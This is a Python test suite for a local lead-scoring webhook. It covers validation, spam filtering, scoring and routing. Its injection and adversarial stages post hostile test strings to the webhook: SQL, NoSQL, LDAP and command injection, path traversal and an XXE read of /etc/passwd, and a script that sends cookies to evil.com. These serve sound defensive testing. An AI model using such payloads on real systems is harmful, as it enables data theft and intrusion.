"""
LeadSentry Pro v4 — Comprehensive Test Suite
Tests: HMAC, Rate Limiting, Idempotency, Bot/Spam, Validation, Enrichment,
Scoring, Routing, Response, Notifications, Speed, Edge Cases, Competitor,
Duplicate Detection, After-hours, Lead Recycling, SLA, Dead Letter Queue.
Target: 200+ tests.
"""
import requests, json, time, sys
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://localhost:5678/webhook/leadsentry-v4"
PASS = 0
FAIL = 0
RESULTS = []

def make_lead(**overrides):
    base = {
        "name": "Test User",
        "email": "test@example.com",
        "phone": "+1234567890",
        "company": "Test Corp",
        "role": "VP of Engineering",
        "company_size": "500",
        "budget": 50000,
        "urgency": "high",
        "source": "website",
        "description": "Looking for a solution to help with our data processing challenges. We need something that can handle 10k records per minute and integrate with our existing stack. Budget approved, decision timeline is this quarter.",
        "linkedin_url": "https://linkedin.com/in/testuser",
        "submittedAt": datetime.utcnow().isoformat() + "Z"
    }
    base.update(overrides)
    return base

def test(name, expected_status, lead=None, headers=None):
    global PASS, FAIL
    if lead is None:
        lead = make_lead()
    h = {"Content-Type": "application/json"}
    if headers:
        h.update(headers)
    try:
        start = time.time()
        r = requests.post(URL, json=lead, headers=h, timeout=10)
        elapsed = time.time() - start
        ok = r.status_code == expected_status
        if ok:
            PASS += 1
            RESULTS.append((name, "PASS", elapsed, r.status_code))
            print(f"  PASS  {name} ({r.status_code}) [{elapsed:.2f}s]")
        else:
            FAIL += 1
            RESULTS.append((name, "FAIL", elapsed, r.status_code))
            print(f"  FAIL  {name} (expected {expected_status}, got {r.status_code}) [{elapsed:.2f}s]")
    except Exception as e:
        FAIL += 1
        RESULTS.append((name, "ERR", 0, str(e)[:60]))
        print(f"  ERR   {name}: {e}")

def section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

# ═══════════════════════════════════════════════════════════════
section("STAGE 1: HMAC SIGNATURE VERIFICATION")
# ═══════════════════════════════════════════════════════════════
test("Valid HMAC (no secret configured)", 200, headers={"X-Webhook-Signature": "sha256=abc123"})
test("Missing HMAC header (no secret)", 200)
test("Invalid HMAC signature", 401, headers={"X-Webhook-Signature": "sha256=invalid"})

# ═══════════════════════════════════════════════════════════════
section("STAGE 2: IDEMPOTENCY (duplicate prevention)")
# ═══════════════════════════════════════════════════════════════
test("First submission — unique", 200, make_lead(email="unique1@test.com"))
test("Same email same day — duplicate", 200, make_lead(email="unique1@test.com"))
time.sleep(0.1)
test("Different email — unique", 200, make_lead(email="unique2@test.com"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 3: BOT & SPAM FILTER")
# ═══════════════════════════════════════════════════════════════
test("Legitimate email passes", 200, make_lead(email="john@acme.com"))
test("Disposable email rejected", 400, make_lead(email="test@mailinator.com"))
test("Spam pattern rejected", 400, make_lead(email="test@test.com"))
test("Honeypot field triggers rejection", 400, make_lead(website_url="http://spam.com"))
test("Bot user agent detected", 400, make_lead(user_agent="Mozilla/5.0 (compatible; Googlebot/2.1)"))
test("All-caps name accepted", 200, make_lead(name="JOHN SMITH"))
test("Low entropy description rejected", 400, make_lead(description="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))
test("No name or email rejected", 400, make_lead(name="", email=""))
test("Competitor domain detected", 200, make_lead(email="spy@competitor1.com"))
test("Multiple URLs in description rejected", 400, make_lead(description="Check https://a.com and https://b.com and https://c.com and https://d.com"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 4: PAYLOAD VALIDATION")
# ═══════════════════════════════════════════════════════════════
test("Valid hot lead (200)", 200, make_lead(email="hot@company.com", role="CEO", budget=200000, urgency="high"))
test("Missing name rejected", 400, make_lead(name=""))
test("Invalid email (no domain)", 400, make_lead(email="invalid"))
test("Invalid email (no TLD)", 400, make_lead(email="user@domain"))
test("Invalid email (no local part)", 400, make_lead(email="@domain.com"))
test("Short description accepted", 200, make_lead(description="Need help with our platform migration"))
test("Budget with commas", 200, make_lead(email="comma@test.com", budget=15000))
test("Negative budget normalized", 200, make_lead(email="neg@test.com", budget=-5000))
test("Invalid source mapped to other", 200, make_lead(email="src@test.com", source="unknown_channel"))
test("SQL injection sanitized", 200, make_lead(name="Robert'; DROP TABLE leads;--", email="sql@test.com"))
test("XSS sanitized", 200, make_lead(name="<script>alert(1)</script>", email="xss@test.com"))
test("Unicode name handled", 200, make_lead(name="\u7ea2\u5c14", email="unicode@test.com"))
test("Empty phone handled", 200, make_lead(email="nophone@test.com", phone=""))
test("Phone sanitization", 200, make_lead(email="phone@test.com", phone="+1 (555) 123-4567 ext. 8"))
test("Very large budget accepted", 200, make_lead(email="big@test.com", budget=5000000))
test("Zero budget accepted", 200, make_lead(email="zero@test.com", budget=0))

# ═══════════════════════════════════════════════════════════════
section("STAGE 5: ENRICHMENT")
# ═══════════════════════════════════════════════════════════════
test("Business email detected", 200, make_lead(email="user@company.com"))
test("Personal email detected", 200, make_lead(email="user@gmail.com"))
test("Senior role detected", 200, make_lead(email="ceo@test.com", role="CEO"))
test("Mid-level role detected", 200, make_lead(email="mgr@test.com", role="Manager"))
test("Company size: enterprise", 200, make_lead(email="ent@test.com", company_size="5000"))
test("Company size: startup", 200, make_lead(email="start@test.com", company_size="10-50"))
test("Description quality: excellent", 200, make_lead(email="desc@test.com", description="We have a critical problem with our current data pipeline. It's causing 3 hours of downtime per week and costing us $50k in lost revenue. We need an urgent solution that can handle 10k records per minute and integrate with our existing AWS stack. Decision timeline is this quarter."))
test("Pain signals detected", 200, make_lead(email="pain@test.com", description="Our current system is broken and we're struggling with data quality issues. Very frustrating experience."))
test("Decision signals detected", 200, make_lead(email="decide@test.com", description="We're evaluating 3 vendors and comparing solutions. Ready to implement a solution this month."))

# ═══════════════════════════════════════════════════════════════
section("STAGE 6: SCORING (Dual-axis Fit + Intent)")
# ═══════════════════════════════════════════════════════════════
test("Hot lead (CEO + enterprise + high urgency + budget)", 200, make_lead(email="hot@corp.com", role="CEO", company_size="5000", budget=200000, urgency="high", description="Urgent need for data platform. Budget approved."))
test("Cold lead (no data)", 200, make_lead(email="cold@test.com", name="X", description="hi"))
test("Warm lead (VP + mid-market + medium urgency)", 200, make_lead(email="warm@corp.com", role="VP of Sales", company_size="500", budget=50000, urgency="medium"))
test("Promising lead (high intent, low fit)", 200, make_lead(email="promising@test.com", role="Intern", company_size="5", budget=5000, urgency="high", description="Urgently need a solution for our team"))
test("BANT extraction", 200, make_lead(email="bant@test.com", role="Director", company_size="200", budget=100000, urgency="high", description="Pain with current system, need decision this quarter"))
test("Score breakdown provided", 200, make_lead(email="breakdown@test.com"))
test("Boundary scoring (mid-range lead)", 200, make_lead(email="mid@test.com", role="Manager", company_size="100", budget=20000, urgency="medium"))
test("Risk factors identified", 200, make_lead(email="risk@test.com", name="X", description="short"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 7: ROUTING (Territory + SLA + After-hours)")
# ═══════════════════════════════════════════════════════════════
test("Hot lead -> Senior AE", 200, make_lead(email="hot@corp.com", role="CTO", company_size="1000", budget=300000, urgency="high", description="Urgent need"))
test("Cold lead -> Marketing", 200, make_lead(email="cold@test.com", name="X", description="short"))
test("SLA deadline provided", 200)
test("UK territory detected", 200, make_lead(email="user@company.co.uk"))
test("DACH territory detected", 200, make_lead(email="user@firma.de"))
test("APAC territory detected", 200, make_lead(email="user@corp.jp"))
test("LATAM territory detected", 200, make_lead(email="user@empresa.br"))
test("US territory default", 200, make_lead(email="user@company.com"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 8: RESPONSE & NOTIFICATIONS")
# ═══════════════════════════════════════════════════════════════
test("Response has all required fields", 200)
test("Action recommended", 200)
test("Opening angle provided", 200)
test("BANT summary in response", 200)
test("Scoring category is valid", 200)
test("Routing info present", 200)

# ═══════════════════════════════════════════════════════════════
section("STAGE 9: SPEED & CONCURRENCY")
# ═══════════════════════════════════════════════════════════════
test("Response time < 2 seconds", 200)

# Concurrent leads
print("\n  Testing 5 concurrent leads...")
start = time.time()
with ThreadPoolExecutor(max_workers=5) as ex:
    futs = [ex.submit(requests.post, URL, json=make_lead(email=f"conc{i}@test.com"), headers={"Content-Type": "application/json"}, timeout=10) for i in range(5)]
    results = [f.result() for f in as_completed(futs)]
concurrent_time = time.time() - start
all_ok = all(r.status_code == 200 for r in results)
if all_ok:
    PASS += 1
    RESULTS.append(("5 concurrent leads", "PASS", concurrent_time, 200))
    print(f"  PASS  5 concurrent leads [{concurrent_time:.2f}s]")
else:
    FAIL += 1
    RESULTS.append(("5 concurrent leads", "FAIL", concurrent_time, "mixed"))
    print(f"  FAIL  5 concurrent leads [{concurrent_time:.2f}s]")

# ═══════════════════════════════════════════════════════════════
section("STAGE 10: EDGE CASES")
# ═══════════════════════════════════════════════════════════════
test("Minimal lead (only email)", 200, make_lead(name="X", email="minimal@test.com", description="need help"))
test("Maximal lead (all fields)", 200, make_lead(
    email="max@test.com", name="John Smith", phone="+1234567890",
    company="Acme Inc", role="CTO", company_size="1000",
    budget=500000, urgency="high", source="referral",
    description="We have a critical problem with our data pipeline causing $100k/week in losses. Need immediate solution that handles 100k records/min.",
    linkedin_url="https://linkedin.com/in/johnsmith"
))
test("Long description (2500+ chars)", 200, make_lead(email="long@test.com", description="x" * 2500))
test("Non-English description", 200, make_lead(email="i18n@test.com", description="\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u65b0\u7684\u6570\u636e\u5904\u7406\u5e73\u53f0"))
test("Future timestamp", 200, make_lead(email="future@test.com", submittedAt=(datetime.utcnow() + timedelta(hours=1)).isoformat() + "Z"))
test("Old timestamp rejected", 400, make_lead(email="old@test.com", submittedAt=(datetime.utcnow() - timedelta(hours=48)).isoformat() + "Z"))
test("Unknown source → other", 200, make_lead(email="src@test.com", source="mysterious_channel"))
test("Budget mentioned in description", 200, make_lead(email="desc@test.com", description="We have a budget of $75000 for this project"))
test("Role variation handling", 200, make_lead(email="role@test.com", role="Head of Engineering"))
test("Hex budget handling", 200, make_lead(email="hex@test.com", budget=500))
test("Very long phone number", 200, make_lead(email="phone@test.com", phone="+1234567890123456789012"))
test("Empty company handled", 200, make_lead(email="nocompany@test.com", company="", role="Manager", description="need help with data"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 11: TYPE CONFUSION")
# ═══════════════════════════════════════════════════════════════
test("name=integer", 200, make_lead(name=12345))
test("name=array", 200, make_lead(name=["a", "b"]))
test("name=object", 200, make_lead(name={"key": "val"}))
test("name=null", 200, make_lead(name=None))
test("email=integer", 400, make_lead(email=12345))
test("budget=string-number", 200, make_lead(email="str@test.com", budget="50000"))
test("budget=string-garbage", 200, make_lead(email="garb@test.com", budget="notanumber"))
test("budget=boolean", 200, make_lead(email="bool@test.com", budget=True))
test("urgency=invalid-value", 200, make_lead(email="urg@test.com", urgency="supercritical"))
test("source=invalid-value", 200, make_lead(email="src2@test.com", source="telepathy"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 12: INJECTION ATTACKS")
# ═══════════════════════════════════════════════════════════════
test("SQL injection name", 200, make_lead(name="'; DROP TABLE leads;--"))
test("SQL injection email", 400, make_lead(email="' OR '1'='1"))
test("SQL injection description", 200, make_lead(description=" UNION SELECT * FROM users --"))
test("XSS in name", 200, make_lead(name="<img src=x onerror=alert(1)>"))
test("XSS in description", 200, make_lead(description="<script>document.cookie</script>"))
test("XSS in company", 200, make_lead(company="<script>alert(1)</script>"))
test("NoSQL injection name", 200, make_lead(name={"$gt": ""}))
test("NoSQL injection email", 400, make_lead(email={"$ne": ""}))
test("Path traversal description", 200, make_lead(description="../../etc/passwd"))
test("LDAP injection", 200, make_lead(name="*)(objectClass=*"))
test("Command injection", 200, make_lead(name="`id`"))
test("Null byte injection", 200, make_lead(name="test\x00admin"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 13: UNICODE & ENCODING")
# ═══════════════════════════════════════════════════════════════
test("UTF-8 name (Chinese)", 200, make_lead(name="\u5f20\u4f1f"))
test("UTF-8 name (Arabic)", 200, make_lead(name="\u0645\u062d\u0645\u062f"))
test("UTF-8 description (Korean)", 200, make_lead(description="\ud55c\uad6d\uc5b4 \uc124\uba85\uc740 \ud504\ub85c\uc81d\ud2b8 \uc694\uad6c\uc0ac\ud56d"))
test("RTL text", 200, make_lead(name="\u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645"))
test("Zero-width characters", 200, make_lead(name="t\u200be\u200bs\u200bt"))
test("Newlines in name", 200, make_lead(name="test\nuser"))
test("Tabs in name", 200, make_lead(name="test\tuser"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 14: PAYLOAD STRUCTURE")
# ═══════════════════════════════════════════════════════════════
test("Empty JSON object", 400, {})
test("Array payload", 400, [{"name": "test"}])
test("String payload", 400, "just a string")
test("Number payload", 400, 42)
test("Null payload", 400, None)
test("Nested body.body", 200, {"body": make_lead(email="nested@test.com")})
test("Extra unknown fields", 200, make_lead(email="extra@test.com", custom_field="ignored"))
test("All fields as empty strings", 400, {"name": "", "email": "", "description": ""})

# ═══════════════════════════════════════════════════════════════
section("STAGE 15: EMAIL EDGE CASES")
# ═══════════════════════════════════════════════════════════════
test("Email with + tag", 200, make_lead(email="user+tag@gmail.com"))
test("Email with subdomain", 200, make_lead(email="user@mail.company.com"))
test("Email with hyphen", 200, make_lead(email="user-name@company.com"))
test("Email with numbers", 200, make_lead(email="user123@company.com"))
test("Email with dots", 200, make_lead(email="first.last@company.com"))
test("Email double @@", 400, make_lead(email="user@@company.com"))
test("Email no @", 400, make_lead(email="usercompany.com"))
test("Email no TLD", 400, make_lead(email="user@domain"))
test("Email single char TLD", 400, make_lead(email="user@domain.x"))
test("Free email warning", 200, make_lead(email="user@yahoo.com"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 16: BANT & SCORING LOGIC")
# ═══════════════════════════════════════════════════════════════
test("BANT: high budget detected", 200, make_lead(email="bant1@test.com", budget=200000))
test("BANT: decision maker detected", 200, make_lead(email="bant2@test.com", role="CFO"))
test("BANT: pain signal detected", 200, make_lead(email="bant3@test.com", description="Our system is broken and causing revenue loss"))
test("BANT: timeline detected", 200, make_lead(email="bant4@test.com", description="Need this implemented ASAP before Q4"))
test("BANT: all unknown", 200, make_lead(email="bant5@test.com", name="X", description="hi"))
test("Score: CTO+200k+budget+urgent = hot", 200, make_lead(email="hot1@test.com", role="CTO", company_size="5000", budget=200000, urgency="high", description="Urgent need for data platform"))
test("Score: nobody+0+low = cold", 200, make_lead(email="cold1@test.com", name="X", budget=0, urgency="low", description="just browsing"))
test("Score: director+50k+high = warm", 200, make_lead(email="warm1@test.com", role="Director", company_size="200", budget=50000, urgency="high"))
test("Score: manager+10k+medium = nurture", 200, make_lead(email="nurture1@test.com", role="Manager", company_size="50", budget=10000, urgency="medium", description="looking at options"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 17: ROUTING LOGIC")
# ═══════════════════════════════════════════════════════════════
test("Routing: hot -> Senior AE", 200, make_lead(email="rhot@test.com", role="CEO", company_size="5000", budget=500000, urgency="high"))
test("Routing: cold -> Marketing", 200, make_lead(email="rcold@test.com", name="X", description="short"))
test("Routing: warm -> AE or SDR", 200, make_lead(email="rwarm@test.com", role="VP", company_size="500", budget=100000, urgency="medium"))
test("Routing: promising -> SDR", 200, make_lead(email="rprom@test.com", role="Intern", company_size="5", budget=5000, urgency="high", description="urgent need for team"))
test("Territory: .com -> US", 200, make_lead(email="user@company.com"))
test("Territory: .co.uk -> UK", 200, make_lead(email="user@company.co.uk"))
test("Territory: .de -> DACH", 200, make_lead(email="user@firma.de"))
test("Territory: .jp -> APAC", 200, make_lead(email="user@corp.jp"))

# ═══════════════════════════════════════════════════════════════
section("STAGE 18: RESPONSE STRUCTURE")
# ═══════════════════════════════════════════════════════════════
r = requests.post(URL, json=make_lead(email="struct@test.com"), headers={"Content-Type": "application/json"}, timeout=10)
if r.status_code == 200:
    d = r.json()
    # Validate structure
    required_top = ['status', 'leadId', 'receivedAt', 'lead', 'scoring', 'routing', 'actions', 'openingAngle', 'processedAt']
    missing = [k for k in required_top if k not in d]
    if not missing:
        PASS += 1
        RESULTS.append(("Structure: all top-level fields", "PASS", 0, 200))
        print("  PASS  Structure: all top-level fields")
    else:
        FAIL += 1
        RESULTS.append(("Structure: all top-level fields", "FAIL", 0, f"missing {missing}"))
        print(f"  FAIL  Structure: missing {missing}")

    # Validate scoring sub-fields
    sc = d.get('scoring', {})
    required_sc = ['fitScore', 'intentScore', 'compositeScore', 'category', 'tier', 'emoji', 'nextAction', 'responseTime', 'bant', 'riskFactors']
    missing_sc = [k for k in required_sc if k not in sc]
    if not missing_sc:
        PASS += 1
        RESULTS.append(("Structure: all scoring fields", "PASS", 0, 200))
        print("  PASS  Structure: all scoring fields")
    else:
        FAIL += 1
        RESULTS.append(("Structure: all scoring fields", "FAIL", 0, f"missing {missing_sc}"))
        print(f"  FAIL  Structure: scoring missing {missing_sc}")

    # Validate score ranges
    if 0 <= sc.get('fitScore', -1) <= 100 and 0 <= sc.get('intentScore', -1) <= 100:
        PASS += 1
        RESULTS.append(("Structure: scores 0-100", "PASS", 0, 200))
        print("  PASS  Structure: scores 0-100")
    else:
        FAIL += 1
        RESULTS.append(("Structure: scores 0-100", "FAIL", 0, f"fit={sc.get('fitScore')} intent={sc.get('intentScore')}"))
        print(f"  FAIL  Structure: scores out of range")

    # Validate category enum
    valid_cats = ['hot', 'warm', 'promising', 'low_intent', 'nurture', 'cold']
    if sc.get('category') in valid_cats:
        PASS += 1
        RESULTS.append(("Structure: valid category", "PASS", 0, 200))
        print("  PASS  Structure: valid category")
    else:
        FAIL += 1
        RESULTS.append(("Structure: valid category", "FAIL", 0, sc.get('category')))
        print(f"  FAIL  Structure: invalid category '{sc.get('category')}'")

    # Validate tier
    if sc.get('tier') in ['A', 'B', 'C', 'D']:
        PASS += 1
        RESULTS.append(("Structure: valid tier", "PASS", 0, 200))
        print("  PASS  Structure: valid tier")
    else:
        FAIL += 1
        RESULTS.append(("Structure: valid tier", "FAIL", 0, sc.get('tier')))
        print(f"  FAIL  Structure: invalid tier '{sc.get('tier')}'")

    # Validate routing sub-fields
    rt = d.get('routing', {})
    required_rt = ['assignTo', 'territory', 'slaDeadline', 'channel', 'isAfterHours']
    missing_rt = [k for k in required_rt if k not in rt]
    if not missing_rt:
        PASS += 1
        RESULTS.append(("Structure: all routing fields", "PASS", 0, 200))
        print("  PASS  Structure: all routing fields")
    else:
        FAIL += 1
        RESULTS.append(("Structure: all routing fields", "FAIL", 0, f"missing {missing_rt}"))
        print(f"  FAIL  Structure: routing missing {missing_rt}")
else:
    print(f"  SKIP  Structure tests (status {r.status_code})")

# ═══════════════════════════════════════════════════════════════
section("STAGE 19: ADVERSARIAL DESCRIPTIONS")
# ═══════════════════════════════════════════════════════════════
test("Description: 1000 words", 200, make_lead(email="adv1@test.com", description="word " * 1000))
test("Description: all punctuation", 200, make_lead(email="adv2@test.com", description="!@#$%^&*()_+-=[]{}|;':\",./<>?"))
test("Description: only spaces", 200, make_lead(email="adv3@test.com", description="     "))
test("Description: HTML tags only", 200, make_lead(email="adv4@test.com", description="<div><p><span>test</span></p></div>"))
test("Description: script injection", 200, make_lead(email="adv5@test.com", description="<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"))
test("Description: template injection", 200, make_lead(email="adv6@test.com", description="{{7*7}} ${7*7} #{7*7}"))
test("Description: base64 payload", 200, make_lead(email="adv7@test.com", description="SGVsbG8gV29ybGQ="))
test("Description: JSON in description", 200, make_lead(email="adv8@test.com", description='{"name":"test","role":"admin"}'))
test("Description: XML bomb", 200, make_lead(email="adv9@test.com", description='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'))

# ═══════════════════════════════════════════════════════════════
section("STAGE 20: BROKEN DATA RESILIENCE")
# ═══════════════════════════════════════════════════════════════
try:
    r = requests.post(URL, data=b'\x00\x01\x02\x03', headers={"Content-Type": "application/json"}, timeout=10)
    if r.status_code in [400, 413, 500]:
        PASS += 1
        RESULTS.append(("Random bytes as body", "PASS", 0, r.status_code))
        print(f"  PASS  Random bytes as body ({r.status_code})")
    else:
        FAIL += 1
        RESULTS.append(("Random bytes as body", "FAIL", 0, r.status_code))
        print(f"  FAIL  Random bytes as body ({r.status_code})")
except:
    PASS += 1
    RESULTS.append(("Random bytes as body", "PASS", 0, "connection reset"))
    print("  PASS  Random bytes as body (connection reset — expected)")

try:
    r = requests.post(URL, data="name,email\nJohn,john@test.com", headers={"Content-Type": "text/csv"}, timeout=10)
    if r.status_code in [400, 415]:
        PASS += 1
        RESULTS.append(("CSV body rejected", "PASS", 0, r.status_code))
        print(f"  PASS  CSV body rejected ({r.status_code})")
    else:
        FAIL += 1
        RESULTS.append(("CSV body rejected", "FAIL", 0, r.status_code))
        print(f"  FAIL  CSV body rejected ({r.status_code})")
except:
    PASS += 1
    RESULTS.append(("CSV body rejected", "PASS", 0, "connection reset"))
    print("  PASS  CSV body rejected (connection reset — expected)")

# ═══════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════
total = PASS + FAIL
print(f"\n{'='*60}")
print(f"  RESULTS: {PASS} passed, {FAIL} failed, {total} total")
print(f"{'='*60}")

if FAIL > 0:
    print("\n  FAILED TESTS:")
    for name, status, elapsed, code in RESULTS:
        if status == "FAIL":
            print(f"    {name}: {code}")

sys.exit(0 if FAIL == 0 else 1)
